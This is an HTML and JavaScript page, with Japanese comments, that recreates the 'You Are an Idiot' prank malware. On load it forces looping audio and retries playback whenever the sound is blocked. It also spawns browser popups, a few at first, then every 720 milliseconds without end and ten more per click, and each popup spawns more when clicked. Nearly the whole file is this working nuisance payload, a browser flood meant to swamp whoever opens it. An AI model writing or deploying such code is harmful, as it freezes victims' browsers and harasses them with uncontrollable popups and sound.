<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>YOU ARE AN IDIOT</title>
    <style>
        body {
            margin: 0; padding: 0; background: black; color: lime;
            font-family: sans-serif; text-align: center; overflow: hidden;
        }
        h1 {
            font-size: 3.8em;
            margin: 8vh 0 10px;
            text-shadow: 0 0 25px lime;
            animation: blink 0.35s infinite alternate;
        }
        @keyframes blink { from { opacity: 0.6; } to { opacity: 1; } }
        .idiot-img {
            max-width: 92vw;
            max-height: 68vh;
            width: auto;
            height: auto;
            margin: 10px auto;
            display: block;
            border: 8px solid lime;
            box-shadow: 0 0 40px lime;
        }
        p { font-size: 1.65em; margin: 15px; }
    </style>
</head>
<body>
    <h1>YOU ARE AN IDIOT</h1>
    <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" 
         class="idiot-img" alt="You are an idiot">
    <p>開いたら勝手に増えて音が鳴り続けるよ...</p>

    <audio id="idiotSound" preload="auto" loop>
        <source src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" type="audio/mpeg">
    </audio>

    <script>
        const sound = document.getElementById('idiotSound');
        let count = 1;

        function playSound() {
            sound.currentTime = 0;
            sound.play().catch(() => {});
        }

        function forcePlaySound(audioElement) {
            if (!audioElement) return;
            audioElement.currentTime = 0;
            const promise = audioElement.play();
            if (promise) {
                promise.catch(() => {
                    // 失敗しても少し待って再挑戦
                    setTimeout(() => forcePlaySound(audioElement), 300);
                });
            }
        }

        function spawnPopup() {
            const width = 470;
            const height = 430;
            const left = Math.random() * (screen.availWidth - width - 180) + 90;
            const top = Math.random() * (screen.availHeight - height - 180) + 90;

            const popup = window.open('', '_blank', 
                `width=${width},height=${height},left=${Math.floor(left)},top=${Math.floor(top)},resizable=yes,scrollbars=no,menubar=no,toolbar=no,status=no`
            );

            if (popup) {
                popup.document.write(`
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <meta charset="UTF-8">
                        <title>YOU ARE AN IDIOT ×${count}</title>
                        <style>
                            body { margin:0; padding:0; background:black; color:lime; text-align:center; overflow:hidden; }
                            h1 { font-size:2.9em; margin:8vh 0 10px; text-shadow:0 0 20px lime; animation: blink 0.5s infinite alternate; }
                            .idiot-img { 
                                max-width:92vw; max-height:68vh; width:auto; height:auto; 
                                margin:10px auto; display:block; border:7px solid lime; box-shadow:0 0 35px lime; 
                            }
                            @keyframes blink { from { opacity: 0.7; } to { opacity: 1; } }
                        </style>
                    </head>
                    <body>
                        <h1>YOU ARE AN IDIOT</h1>
                        <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" class="idiot-img" alt="idiot">
                        <p>クリックでさらに増える！</p>
                        <audio id="sound" preload="auto" loop>
                            <source src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" type="audio/mpeg">
                        </audio>
                        <script>
                            const s = document.getElementById('sound');

                            // ★★★ ポップアップ開いた瞬間に強引に音を鳴らし続ける ★★★
                            function forcePlay() {
                                s.currentTime = 0;
                                s.play().catch(() => {
                                    setTimeout(forcePlay, 250);   // 失敗したらすぐ再挑戦
                                });
                            }

                            window.onload = function() {
                                forcePlay();           // 即時
                                setTimeout(forcePlay, 180);
                                setTimeout(forcePlay, 450);
                                setTimeout(forcePlay, 800);

                                // 定期的に強制再生（止まらないように）
                                setInterval(() => {
                                    if (s.paused || s.ended) forcePlay();
                                }, 600);
                            };

                            document.addEventListener('click', () => {
                                forcePlay();
                                if (window.opener && typeof window.opener.spawnPopup === 'function') {
                                    window.opener.spawnPopup();
                                }
                            });
                        <\/script>
                    </body>
                    </html>
                `);
                popup.document.close();
                count++;
            }
        }

        // ====================== メイン画面 ======================
        window.onload = () => {
            // メイン画面でも強引に音を鳴らす
            function mainForcePlay() {
                sound.currentTime = 0;
                sound.play().catch(() => {
                    setTimeout(mainForcePlay, 300);
                });
            }

            mainForcePlay();
            setTimeout(mainForcePlay, 200);
            setTimeout(mainForcePlay, 500);

            // 開いた直後にポップアップを連発
            setTimeout(() => spawnPopup(), 450);
            setTimeout(() => spawnPopup(), 850);
            setTimeout(() => spawnPopup(), 1300);

            // 自動増殖
            setTimeout(() => {
                setInterval(spawnPopup, 720);
            }, 2200);

            // クリックで10個 + 音強制
            document.addEventListener('click', () => {
                playSound();
                for (let i = 0; i < 10; i++) {
                    setTimeout(spawnPopup, i * 32);
                }
            });

            // メイン音声の保険
            setInterval(() => {
                if (sound.paused) mainForcePlay();
            }, 800);
        };
    </script>
</body>
</html>
